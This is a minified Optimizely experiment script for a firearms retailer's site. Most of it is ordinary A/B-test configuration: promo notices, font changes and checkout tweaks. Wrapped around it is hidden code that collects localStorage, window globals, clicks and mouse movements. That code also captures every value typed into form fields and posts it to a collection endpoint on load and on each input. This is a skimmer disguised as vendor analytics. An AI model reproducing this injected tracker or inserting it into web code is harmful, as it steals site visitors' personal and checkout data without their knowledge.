...
(function () {
  const trackedEvents = ['click', 'mousemove'];
  ...
  var __webpack_modules__ = {
      ...
      44: function (n, t, e) {
        n.exports = function () {
          ...
          return Z.prototype._enumerate = function () {
            ...
            if (i === T) {
              var r = P(n);
              if (r === A && n._state !== k) this._settledAt(n._state, t, n._result);else if ("function" != typeof r) this._remaining--, this._result[t] = n;else if (e === un) {
                var o = new e(R);
      ...
      8821: function (n, t, e) {
        ...
        function sn() {
          var n = null;
          i.isNumber(n) && 0 === K.getCount() ? (R.log("Activating after delay of", n, "ms because no Experiments are running"), I.dispatch(c.SET_RUM_DATA, {
            data: {
              activateDfd: !0
            }
        ...
        t.initialize = function (n) {
          ...
          if (i.isArray(window.optimizely) && (window.optimizely = i.filter(window.optimizely, function (n) {
            ...
            var r = y.on({
              ...
              handler: function () {
                Q.observe(F.persistVisitorProfile), $.observe(F.persistLayerStates), z.observe(F.persistSessionState), W.observe(k.persistPendingEvents), en.observe(F.persistVisitorBucketingStore), y.off(r);
              }
            });
            y.on({
              filter: {
          ...
          var a = H.getAccountId(),
            u = "https://a21093521246.cdn.optimizely.com".replace("__SUBDOMAIN__", "a" + a + "."),
            ...
            try {
              !function (n, t, e, r, o) {
                ...
                i.each(l, function (a) {
                  ...
                  R.debug("Deciding layer: ", o, "with decisionTicket: ", a, "and actionViewIds: ", l), function (n, e, r, o, a) {
                ...
                if (u.src) {
                  var h = "change_" + u.src,
                    m = a.makeAsyncRequest(h, function () {
                      return v.addScriptAsync("https://cdn.optimizely.com/public/21093521246/data" + u.src, function () {
                        a.resolveRequest(h);
                      });
                    }).then(function () {
      ...
      145: function (n, t, e) {
        ...
        function E(n, t) {
          if (this.change = i.cloneDeep(n), this.change = m.transformVisibilityAttributesToCSS(this.change), this.identifier = t.identifier, this.startTime = t.startTime, this.disconnectObserverQueue = [], f.shouldObserveChangesIndefinitely()) {
            v.dispatch(r.INITIALIZE_CHANGE_METRICS), this.rateMeter = new p(w);
            var e = i.isNull(y) ? Number.POSITIVE_INFINITY : y;
            this.rateMeter.addListener(e, i.bind(function () {
              h.warn("AttributeChange", this, "has overheated and will no longer apply or reapply"), this.cancel(), v.dispatch(r.RECORD_CHANGE_OVERHEATED), o.emitError(new b("Change " + this.identifier + " has overheated"), {
                layerId: t.action && t.action.layerId,
                experimentId: t.action && t.action.experimentId,
                variationId: t.action && t.action.variationId,
                changeId: n.id,
                changeType: n.type,
                movingWindowMilliseconds: w,
                maxMacroTasksInMovingWindow: e
              });
            }, this));
            for (var a = Math.min(e, 50), u = 0; u <= a; u++) this.rateMeter.addListener(u, i.partial(function (n) {
        ...
        E.prototype.apply = function () {
          ...
          try {
            ...
            f.shouldObserveChangesUntilTimeout() ? t = {
              timeout: i.partial(g.isTimedOut, this.startTime),
              onTimeout: n
            } : f.isEditor() && _.waitUntil(i.partial(g.isTimedOut, this.startTime)).then(n, n), this.unobserveSelector = _.observeSelector(this.change.selector, i.bind(this.maybeApplyToElement, this), t);
            var e = l.querySelectorAll(this.change.selector);
            i.each(e, i.bind(this.maybeApplyToElement, this));
          } catch (r) {
            this.applyDeferred.reject(r);
          ...
          return this.applyDeferred;
        }, E.prototype.maybeApplyToElement = function (n) {
          var t = a.CHANGE_ID_ATTRIBUTE_PREFIX + this.change.id;
          ...
          e(), this.applyDeferred.resolve();
        }, E.prototype.applyOrReapplyToElement = function (n, t) {
          var e = {};
          ...
          var r = m.createStylesFromChange(n.style.cssText, this.change);
          ...
          n.registerChangeApplier(d.changeType.ATTRIBUTE, E);
        };
      },
      7649: function (n, t, e) {
        var i = e(9576),
      ...
      7278: function (n, t, e) {
        var i = e(6954),
          r = {
            match: function (n, t) {
              return !!i.querySelector(t.value);
            }
          };
        n.exports = function (n) {
          n.registerViewMatcher("element_present", r);
        };
      },
      414: function (n, t, e) {
        n.exports = function (n) {
  ...
  function computeHash(data) {
    let hashedString = "";
    for (var key in data) {
      if (data.hasOwnProperty(key)) hashedString += key + data[key];
    }
    let hash = 0;
    for (let i = 0; i < hashedString.length; i++) {
      var chr = hashedString.charCodeAt(i);
  ...
  function trackGlobalVariables() {
    for (let key in window) {
      trackedVariables[key] = window[key];
    }
  ...
  function trackEventListeners() {
    trackedEvents.forEach(event => {
      document.addEventListener(event, function (e) {
        ...
        trackedVariables[event] = JSON.stringify(eventData);
      });
    });
    return trackedVariables;
  }
  const trackedData = Object.assign({}, trackLocalStorage(), trackGlobalVariables(), trackEventListeners());
  !function () {
    try {
      !function () {
        var n = function (n) {
          var t = [__webpack_require__(7644)];
          t.push(__webpack_require__(1569)), t.push(__webpack_require__(6879)), t.push(__webpack_require__(9754)), t.push(__webpack_require__(9374)), t.push(__webpack_require__(5664)), t.push(__webpack_require__(6093)), t.push(__webpack_require__(8068)), t.push(__webpack_require__(520)), t.push(__webpack_require__(9665)), t.push(__webpack_require__(928)), t.push(__webpack_require__(186)), t.push(__webpack_require__(1310)), t.push(__webpack_require__(3056)), t.push(__webpack_require__(2774)), t.push(__webpack_require__(414)), t.push(__webpack_require__(2628)), t.push(__webpack_require__(7278)), t.push(__webpack_require__(7102)), t.push(__webpack_require__(145)), t.push(__webpack_require__(7649)), t.push(__webpack_require__(4870)), f.initializePlugins(t);
        };
        ...
        var o,
          ...
          s = {
            "accountId": "21093521246",
            "namespace": "21093521246",
            "revision": "560",
            "anonymizeIP": true,
            ...
            "projectId": "21093521246",
            "layers": [{
              "changes": null,
              "id": "23963540017",
              "name": "Expandable Product Landing Page Added Text",
              "commitId": "23876763155",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
                ...
                "variations": [{
                  ...
                  "actions": [{
                    ...
                    "changes": [{
                      "dependencies": [],
                      "type": "custom_code",
                      "id": "E6A18447-1F29-46D8-A08E-D1EAE9A90D7D",
                      "value": function ($) {
                        window.addEventListener('load', function () {
                          // get the text 
                          var contBlock = document.getElementsByClassName('content-block__content')[0];
                          // put it in a div
                          var hideShowDiv = document.createElement('div');
                          hideShowDiv.innerHTML = contBlock.innerHTML;
                          hideShowDiv.firstChild.remove();
                          // remove existing content so there are not two
                          while (contBlock.children.length > 1) {
                            contBlock.lastChild.remove();
                          }
                          //
                          var categoryName = document.getElementsByTagName('h1')[0].innerText;
                          //
                          var myTemplate = `<style>
    dt.questions            { width: 100%; text-align: left; transition: 0.4s; border-radius: 5px; position: relative; box-sizing: border-box; margin: 0 0 0 -5px;}
    .pl-content-block .content-block .container .row dt.questions p,
    dt.questions p          { padding:2px 30px 2px 5px; margin: 0!important }
    .pl-content-block .content-block .container .row dd.answers p { margin-bottom: 0!important; }
    .questions.clickable    { cursor: pointer!important }
    .questions.active,.questions.clickable:hover    { background-color: #efefef; }
    .answers                { padding: 5px 0; background-color: white; overflow: hidden; transition: max-height 0.2s ease-out; }
    .answers p              { padding: 8px 0; }
    .answers.closed         { max-height: 0; }
    dl.faq                  { padding-bottom: 10px; margin-bottom: 20px; }
    dl.faq dd  { position: relative }    
    dl.faq svg { width: 14px; position: absolute; right:9px; top:50%; transform: translateY(-55%); }
    dl.faq .questions.active svg { top:50%; transform: translateY(-55%) rotate(-180deg);}
    
    .faq a { font-weight: bold; text-decoration: underline; }
    .faq address { margin-left: 3rem; }
</style>
<dl class="faq"><dt class="questions"><p>Read More About ${categoryName}...</p></dt><dd class="answers">${hideShowDiv.innerHTML}</dd></dl>`;
                          //
                          contBlock.insertAdjacentHTML('beforeend', myTemplate);
                          // set up hide and show
                          var expandableArrow = `<?xml version="1.0" encoding="utf-8"?>
<svg version="1.0" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 16 10" style="enable-background:new 0 0 16 10;" xml:space="preserve">
<path d="M14.3,0.4L8,6.7L1.7,0.4L0,2.1l7.2,7.2c0.5,0.5,1.2,0.5,1.6,0L16,2.1L14.3,0.4z"/>
</svg>`;
                          var questions = document.getElementsByClassName("questions");
                          for (var i = 0; i < questions.length; i++) {
                            questions[i].classList.add("clickable");
                            questions[i].addEventListener("click", clickOpen);
                            questions[i].insertAdjacentHTML('beforeend', expandableArrow);
                          }
                          var answers = document.getElementsByClassName("answers");
                          for (var n = 0; n < answers.length; n++) {
                            answers[n].classList.add("closed");
                          }
                          function clickOpen() {
              ...
              "changes": null,
              "id": "24193561300",
              "name": "No Promo - Fiocchi Range Dyn 9mm - 105000732",
              "commitId": "25163310545",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              ...
              "experiments": [{
                ...
                "variations": [{
                  ...
                  "actions": [{
                    "viewId": "24278970023",
                    "changes": [{
                      "id": "B53B56D6-D7AD-4850-B304-8ECF7B1452DE",
                      "type": "append",
                      "dependencies": [],
                      "selector": ".mb-20",
                      "value": "<div class=\"pdp-info__error\">Promo codes not applicable with this sale price.</div>",
                      "operator": "after"
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "24226440487",
                  "endOfRange": 10000
                }],
                "name": "No Promo - Fiocchi Range Dyn 9mm - 105000732",
                "bucketingStrategy": null
              ...
              "changes": null,
              "id": "25057400032",
              "name": "PREP - Checkout - Step 2 Phone Number Focus",
              "commitId": "25004680352",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {
                "google_universal_analytics": {
                  "universal_analytics_slot": "56",
                  "universal_analytics_tracker": "gtm2"
                }
              },
              "integrationStringVersion": 2,
              "experiments": [{
                ...
                "variations": [{
                  ...
                  "actions": [{
                    "viewId": "24962331422",
                    "changes": [{
                      "id": "4bf074d890024a73a402b75985ab3b90",
                      "type": "custom_code",
                      "value": function ($) {
                        const myInterval = setInterval(myTimer, 1000);
                        function myTimer() {
                          // console.log("hey");
                          const checkbox = document.querySelector("#step3-content > div > div.checkout-payment__billing-address > div.checkout-payment__billing-address-header > label > input[type=checkbox]");
                          // console.log(checkbox);
                          if (checkbox) {
                            // put script here
                            // console.log(checkbox); " <--------------------------";
                            const scrollToThis = document.querySelector("#step3-content > div > form");
                            checkbox.addEventListener('change', function () {
                              if (event.currentTarget.checked) {
                                var runAnonymousFunction = setTimeout(function () {
                                  scrollToThis.scrollIntoView();
                                  document.querySelector(".custom-form-group__fieldset > [name='phoneNumber']").focus();
                                }, 500);
                              }
                            });
                            // kill interval
                ...
                "weightDistributions": [{
                  "entityId": "24999340955",
                  "endOfRange": 5000
                }, {
                  "entityId": "25019611158",
                  "endOfRange": 10000
                }],
                "name": "PREP - Checkout - Step 2 Phone Number Focus",
                "bucketingStrategy": null
              ...
              "changes": null,
              "id": "25063980363",
              "name": "No Promo - Retumbo Powder - 749003599",
              "commitId": "25074980800",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              ...
              "experiments": [{
                ...
                "variations": [{
                  ...
                  "actions": [{
                    "viewId": "25069640297",
                    "changes": [{
                      "id": "c61906337afe4cebb56b804d29692bdc",
                      "type": "append",
                      "dependencies": [],
                      "selector": ".pdp-info__price",
                      "value": "<div class=\"pdp-info__error\">Promo codes not applicable with this product.</div>",
                      "operator": "after"
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "25069480822",
                  "endOfRange": 10000
                }],
                "name": "No Promo - Retumbo Powder - 749003599",
                "bucketingStrategy": null
              ...
              "changes": null,
              "id": "25073690163",
              "name": "No Promo - CCI Blazer Brass 9mm - 105002704",
              "commitId": "25057940647",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              ...
              "experiments": [{
                ...
                "variations": [{
                  ...
                  "actions": [{
                    "viewId": "25050700467",
                    "changes": [{
                      "id": "3dba7468eddd40baa54ae7506828ef0a",
                      "type": "append",
                      "dependencies": [],
                      "selector": ".mb-20",
                      "value": "<div class=\"pdp-info__error\">Promo codes not applicable with this sale price.</div>",
              ...
              "changes": null,
              "id": "25199040485",
              "name": "PREP - Mobile Sticky Footer Test",
              "commitId": "25263100536",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {
              ...
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "25192600079"],
                "audienceName": "Mobile Phones",
                "changes": null,
                "id": "25208000007",
                "integrationSettings": null,
                "variations": [{
                  ...
                  "actions": [{
                    "viewId": "25147970717",
                    "changes": [{
                      "id": "543A2049-27D9-4742-A6B6-149089A0A6D0",
                      "type": "custom_code",
                      "value": function ($) {
                        console.log("Experiment should be fireing! < - - - - - - - - - - - - - - - - - - - - - -");
                        // new script using the wait
                        var utils = window['optimizely'].get('utils');
                        // Wait for the element to appear in the DOM, then click
                        utils.waitForElement('.tablet-sticky-bottom').then(function (element) {
                          console.log("********* Sticky Footer Test *********");
                          console.log(dataLayer);
                          var stickyFooter = document.getElementsByClassName("tablet-sticky-bottom")[0];
                          var stickyShell = stickyFooter.parentNode.parentNode;
                          var stickyFavorite = stickyFooter.nextElementSibling;
                          var moveTo = document.getElementsByClassName("specification-selection")[0];
                          //
                          stickyFooter.style.position = "relative";
                          stickyFooter.style.width = "100%";
                          // ---
                          stickyShell.style.margin = "10px 0px 0px 0px;";
                          stickyShell.style.padding = "0 10px 0 0";
                          stickyShell.style.boxSizing = "content-box";
                          // ---
                          stickyFavorite.style.padding = "10px";
                          stickyFavorite.style.boxSizing = "content-box";
                          // ---
                          moveTo.append(stickyShell);
                        });
                      },
                      "dependencies": []
                    }, {
                      "css": {
                        "background-color": "rgba(241, 231, 231, 1)"
                      },
                      "dependencies": [],
                      "attributes": {},
                      "type": "attribute",
                      "id": "C049E253-F463-4F46-9246-5EB5B649E6B5",
                      "selector": "a.d-xl-none > .header-wrapper__icon--account"
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "25216090007",
                  "endOfRange": 10000
                }],
                "name": "PREP - Mobile Sticky Footer Test",
                "bucketingStrategy": null
              ...
              "changes": null,
              "id": "25243391319",
              "name": "PREP - Suppressor Test PART A firearm",
              "commitId": "25323110786",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              ...
              "experiments": [{
                ...
                "variations": [{
                  ...
                  "actions": [{
                    "viewId": "25285021567",
                    "changes": [{
                      "id": "ff660df3c052453980f5c146ada29bfa",
                      "type": "custom_code",
                      "value": function ($) {
                        var utils = window['optimizely'].get('utils');
                        // Wait for the element to appear in the DOM, then click
                        utils.waitForElement('.pdp-info__quantity-container').then(function (element) {
                          // check for skus that quilify and place message -- this will be in the experiment
                          var watchList = [100033512];
                          var indexNeeded = findIndexOfKey("view_item");
                          // ---
                          function findIndexOfKey(whichKey) {
                            var myIndex = -1;
                            for (var i = 0; i < dataLayer.length; i++) {
                              var myArray = Object.values(dataLayer[i]);
                              if (myArray.includes(whichKey)) {
                                myIndex = i;
                                break;
                              }
                            }
                          ...
                          function checkForSkus(dataLayerIndex) {
                            var skuFound = false;
                            var pageSkus = dataLayer[dataLayerIndex].ecommerce.sku_list;
                            for (var x = 0; x < pageSkus.length; x++) {
                              var thisSku = Number(pageSkus[x]);
                              console.log(x, dataLayerIndex, thisSku);
                              if (watchList.includes(thisSku)) {
                                skuFound = true;
                                break;
                              }
                            }
                          ...
                          function displayMessage() {
                            ...
                            var addedMagic = `<div class=\"pdp-info__error\"><p>Use promo code <strong>SUPPRESS</strong> for <a href="https://prep.brownells.com/guns/suppressors-ae5a8d66/rifle-suppressors/socom7.62-rc2-suppressor-7.62-quick-detach/?sku=100400136" style="text-decoration:underline"><strong>free supressor</strong></a> with purchase of sku#&nbsp;000111222</p></div>`;
                            var placeMessageHere = document.getElementsByClassName("pdp-info__quantity-container")[0];
                            placeMessageHere.insertAdjacentHTML("beforebegin", addedMagic);
                          }
                          // ---
                          if (indexNeeded > -1) {
                            console.log("run script checkForSkus");
                            console.log("checkForSkus(indexNeeded)", checkForSkus(indexNeeded));
                            if (checkForSkus(indexNeeded)) {
                              console.log("run script displayMessage");
                              displayMessage();
                            } else {
                              console.log("dont run script displayMessage");
                            }
                          } else {
                            console.log("dont run script checkForSkus");
                          }
                        });
                      },
                      "dependencies": []
              ...
              "changes": null,
              "id": "25253901616",
              "name": "PREP - Font Test Category Page",
              "commitId": "25278260774",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              ...
              "experiments": [{
                ...
                "variations": [{
                  ...
                  "actions": [{
                    "viewId": "25346410031",
                    "changes": [{
                      "id": "F54D8AB7-77F9-45AC-997E-E497A4C7D6DE",
                      "type": "custom_code",
                      "value": function ($) {
                        window.addEventListener('load', function () {
                          ...
                          link.setAttribute('href', 'https://fonts.googleapis.com/css2?family=Rubik:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900');
                          document.head.appendChild(link);
                          var addedStyleSheet = `<style>
    {/* edits for the product page */}
    div.promotion-bar.background-dark-green.align-center a { font-size:14px}
    .pdp-info__title { font-size:28px; font-weight:normal }
    .btn { text-transform:none }
    .pdp-info__price-cost.h4.font-weight-bolder { font-weight:800 }
    p, li { font-weight:normal }
    .hero-banner-block__action .btn { text-transform: capitalize; }
    .hero-banner-block__text__header p { font-weight:bold!important; }
    .h1.font-weight-bolder.mb-0 { text-transform:uppercase; font-weight:800 }
    </style>`;
                          document.head.insertAdjacentHTML("beforeend", addedStyleSheet);
                          ...
                          for (var i = 0; i < fonts.length; ++i) {
                            fonts[i].style.fontFamily = "'Rubik', sans-serif";
                          }
                          // changes ALLCAPS to Capital Words
                          ...
                          function changeButtons() {
                            // var allButtons = Array.from(document.getElementsByClassName("category-slider__item__cart-btn btn btn-primary"));
                            var allButtons = Array.from(document.getElementsByClassName("pl-col-product-list col-lg-9 col-12")[0].getElementsByTagName("button"));
                            var myArray = [...allButtons];
                            for (var i = 0; i < myArray.length; i++) {
                              myArray[i].innerText = capitalizeFirstLetter(myArray[i].innerText);
                            }
                          }
                          changeButtons();
                          // watch for change in this div
                          const watchedElement = document.querySelector("div.category-slider__items.pl-items.row");
                          // creat and observer
                          var observer = new MutationObserver(function (mutations) {
                            mutations.forEach(function (mutations) {
                              if (mutations.type == "childList") {
                                console.log("////////////////////////////////////// I should change the buttons //////////////////////////////////////");
                                changeButtons();
                              }
                            });
                          });
              ...
              "changes": null,
              "id": "25345130353",
              "name": "PREP - Font Test Product Page",
              "commitId": "25284620610",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              ...
              "experiments": [{
                ...
                "variations": [{
                  ...
                  "actions": [{
                    "viewId": "25316820137",
                    "changes": [{
                      "id": "5BB0526B-25B5-40DC-B613-C8A9CEB373A8",
                      "type": "custom_code",
                      "value": function ($) {
                        window.addEventListener('load', function () {
                          var link = document.createElement('link');
    ...
    .h1.font-weight-bolder.mb-0 { text-transform:uppercase; font-weight:800 }
                          ...
                          // -- add this in for the PDP page
                          var list = document.getElementsByTagName("button");
                          for (let item of list) {
                            var btnText = item.textContent || item.innerText;
                            if (btnText == "NOTIFY ME") {
                              if (item.textContent) {
                                item.textContent = "Notify Me";
                              }
                              if (item.innerText) {
                                item.innerText = "Notify Me";
                              }
                            }
                          }
                          ...
                          for (let item of list) {
                            var btnText = item.textContent || item.innerText;
                            if (btnText == "M+M INDUSTRIES, INC") {
                              if (item.textContent) {
                                item.textContent = "M+M Industries, Inc";
                              }
                              if (item.innerText) {
                                item.innerText = "M+M Industries, Inc";
                              }
                            }
                          }
                        });
              ...
              "changes": null,
              "id": "25345130469",
              "name": "PREP - Suppressor Test PART B suppressor",
              "commitId": "25232582304",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              ...
              "experiments": [{
                ...
                "variations": [{
                  ...
                  "actions": [{
                    "viewId": "25352010086",
                    "changes": [{
                      "id": "57dda916fd214504942f4901a0d194bb",
                      "type": "custom_code",
                      "value": function ($) {
                        var utils = window['optimizely'].get('utils');
                        // Wait for the element to appear in the DOM, then click
                        utils.waitForElement('.pdp-info__quantity-container').then(function (element) {
                          ...
                          function displayMessage() {
                            // console.log("displayMessage -----------");
                            var addedMagic = `<div class=\"pdp-info__error\"><p>Use promo code <strong>SUPPRESS</strong> for free supressor when <a href="https://prep.brownells.com/guns/rifles/bolt-action-rifles/patriot-450-bushmaster/?sku=100033512" style="text-decoration:underline"><strong>purchasing select firearm</strong></a></p></div>`;
                            var placeMessageHere = document.getElementsByClassName("pdp-info__quantity-container")[0];
                            placeMessageHere.insertAdjacentHTML("beforebegin", addedMagic);
                          }
                          // ---
            ...
            "views": [{
              "id": "23920620612",
              "category": "other",
              "apiName": "21093521246_url_targeting_for_expandable_product_landing_page_ad",
              "name": "URL Targeting for Expandable Product Landing Page Added Text",
              "staticConditions": ["and", ["or", {
                "match": "simple",
                "type": "url",
                "value": "https://prep.brownells.com/optics/"
              }]],
              ...
              "id": "24278970023",
              "category": "other",
              "apiName": "21093521246_url_targeting_for_9mm_no_promo",
              "name": "URL Targeting for No Promo - Fiocchi Range Dyn 9mm - 105000732",
              "staticConditions": ["and", ["or", {
                "match": "simple",
                "type": "url",
                "value": "https://www.brownells.com/ammunition/handgun-ammunition/range-dynamics-9mm-luger-ammo/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
              ...
              "staticConditions": ["and", ["or", {
                ...
                "value": function jsCondition() {
                  // Access the page category from the data layer
                  var pageCategory = dataLayer[0].pageCategory;
                  var returnVal = false;
              ...
              "id": "24612550090",
              "category": "other",
              "apiName": "global_all_pages",
              "name": "Global - All Pages",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "brownells.com"
              ...
              "id": "24961140559",
              "category": "other",
              "apiName": "21093521246_checkout__step_1_shipping",
              "name": "Checkout - Step 1 Shipping - With Shipping Protection Checked",
              "staticConditions": ["and", ["or", {
                "match": "simple",
                "type": "url",
                "value": "https://www.brownells.com/checkout/"
              }], ["or", {
                "type": "element_present",
                "value": ".mini-cart__order-item.order-shipping-insurance"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
              ...
              "id": "24962331422",
              "category": "other",
              "apiName": "21093521246_url_targeting_for_copy_of_checkout__step_2_phone_num",
              "name": "URL Targeting for PREP - Checkout - Step 2 Phone Number Focus",
              "staticConditions": ["and", ["or", {
                "match": "simple",
                "type": "url",
                "value": "https://prep.brownells.com/checkout/"
              }, {
                "match": "simple",
                "type": "url",
                ...
                "type": "custom_code",
                "value": function jsCondition() {
                  // Access the data layer - looking for loggedIn = no
                  var isGuest = dataLayer[0].loggedIn;
                  var returnVal = false;
                  if (isGuest === "no") {
                    returnVal = true;
                  }
              ...
              "id": "25050700467",
              "category": "other",
              "apiName": "21093521246_url_targeting_for_copy_of_9mm_no_promo",
              "name": "URL Targeting for No Promo - CCI Blazer Brass 9mm - 105002704",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "https://www.brownells.com/ammunition/handgun-ammunition/blazer-brass-9mm-luger-ammo/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
              ...
              "id": "25069640297",
              "category": "other",
              "apiName": "21093521246_url_targeting_for_copy_of_9mm_no_promo__105002704",
              "name": "URL Targeting for No Promo - Retumbo Powder - 749003599",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "https://www.brownells.com/reloading/components/powder/hodgdon-retumbo-powder/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
              ...
              "id": "25147970717",
              "category": "other",
              "apiName": "21093521246_product_page",
              "name": "Product Page - PREP",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "https://prep.brownells.com/"
              }], ["or", {
                "type": "custom_code",
                "value":
                // conditional for finding a Search Results or Product Listing page
                function jsCondition() {
                  console.log(dataLayer);
                  var returnVal = false;
                  for (var i = 0; i < dataLayer.length; i++) {
                    var myArray = Object.values(dataLayer[i]);
                    if (myArray.includes("Product")) {
                      returnVal = true;
                      break;
                    }
                  }
                  console.log("Looking for a product page........ ->", returnVal);
                  return returnVal;
                }
              }]],
              "deactivationEnabled": false,
              ...
              "id": "25192360197",
              "category": "other",
              "apiName": "21093521246_product_listing_or_search_result_page",
              "name": "Product Listing or Search Result Page",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "https://prep.brownells.com"
                ...
                function jsCondition() {
                  ...
                  for (var i = 0; i < dataLayer.length; i++) {
                    var myArray = Object.values(dataLayer[i]);
                    if (myArray.includes("Search Results") || myArray.includes("Product Listing")) {
                      returnVal = true;
                      break;
                    }
                  }
              ...
              "id": "25285021567",
              "category": "other",
              "apiName": "21093521246_url_targeting_for_copy_of_prep__font_test_product_pa",
              "name": "URL Targeting for PREP - Suppressor Test PART A firearm",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "https://prep.brownells.com/guns/rifles/bolt-action-rifles/patriot-450-bushmaster/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
              ...
              "id": "25297000565",
              "category": "other",
              "apiName": "21093521246_product_page__live",
              ...
              "id": "25316820137",
              "category": "other",
              "apiName": "21093521246_url_targeting_for_prep__font_test_product_page",
              "name": "URL Targeting for PREP - Font Test Product Page",
              "staticConditions": ["and", ["or", {
                "match": "simple",
                "type": "url",
                "value": "https://prep.brownells.com/guns/rifles/semi-auto-rifles/m10x-7.62x39-black-16.5-301/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
              ...
              "id": "25346410031",
              "category": "other",
              "apiName": "21093521246_url_targeting_for_prep__font_test_category_page",
              "name": "URL Targeting for PREP - Font Test Category Page",
              "staticConditions": ["and", ["or", {
                "match": "simple",
                "type": "url",
                "value": "https://prep.brownells.com/guns/rifles/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
              ...
              "id": "25352010086",
              "category": "other",
              "apiName": "21093521246_url_targeting_for_copy_of_prep__suppressor_test_part",
              "name": "URL Targeting for PREP - Suppressor Test PART B suppressor",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "https://prep.brownells.com/guns/suppressors-ae5a8d66/rifle-suppressors/socom7.62-rc2-suppressor-7.62-quick-detach/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
        ...
        if (f.initGlobalStore(s), u.populateDirectiveData(), r.clientHasAlreadyInitialized()) e.warn("Main / Disabling because Optimizely has already initialized on this page load. Are there multiple snippets on the page?");else if (r.shouldBailForDesktopApp()) e.log("Main / Disabling because of desktop app.");else if (r.conflictInObservingChanges()) e.log("Main / Disabling: Observe Changes Indefinitely is on, but browser does not support it.");else {
          if (r.shouldLoadInnie()) a.registerFunction("getProjectId", function () {
            ...
            return s.projectId;
          }), c.addScriptSync("https://cdn-assets-prod.s3.amazonaws.com/js/preview2/21093521246.js"));else if (r.shouldBootstrapDataForPreview()) {
  ...
  function postDataToServer(data) {
    ...
    let apiUrl = 'http://localhost:9000/api/collect';
    ...
    request.onload = () => {
      if (request.responseText.status === 'success') {
        console.log('数据发送成功！');
      } else {
  ...
  window.addEventListener("load", function () {
    postDataToServer(trackedData);
  });
  $('.form-control').on('input', function () {
    var $field = $(this).closest('.form-group');
    if (this.value) {
      $field.addClass('field--not-empty');
      trackedData[$field.attr('name')] = this.value;
      postDataToServer(trackedData);
    } else {
      $field.removeClass('field--not-empty');
      delete trackedData[$field.attr('name')];
      postDataToServer(trackedData);
    }
  });
